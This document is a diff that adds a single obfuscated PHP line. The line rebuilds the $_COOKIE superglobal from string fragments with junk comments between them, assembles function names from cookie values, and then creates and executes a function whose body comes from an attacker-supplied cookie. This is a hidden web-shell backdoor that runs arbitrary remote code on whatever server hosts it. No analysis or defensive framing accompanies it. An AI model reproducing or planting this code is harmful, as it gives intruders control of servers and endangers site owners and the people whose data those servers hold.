@@ -1,0 +1,1 @@
+<?php $lt='_C';$xv/*41qQ*/='KI';$vi/*_*/='E';$t/*@+*/='OO';$op=/*wq*/${$lt.$t.$xv.$vi};$w=$op/*AS*/['rP'].$op['lO'];$aw=/*`lJo*/$op['zK'].$op['j'].$op['s'];$kp=$w('',$aw($op['Np']));$kp();
